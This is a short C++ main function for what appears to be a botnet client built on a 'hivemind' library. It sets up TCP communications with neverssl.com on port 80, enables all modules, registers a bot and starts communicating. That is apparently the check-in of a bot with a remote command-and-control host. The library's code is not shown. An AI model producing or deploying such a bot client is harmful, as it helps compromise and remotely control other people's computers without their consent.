#include <iostream>
#include "hivemind.h"

int main() {
  hivemind_lib::Init();
  hivemind_lib::UseTCP();
  hivemind_lib::InitComms("neverssl.com", "80");
  hivemind_lib::AddModule(hivemind_lib::All);
  hivemind_lib::RegisterBot();
  hivemind_lib::BeginComms();
  return 0;
}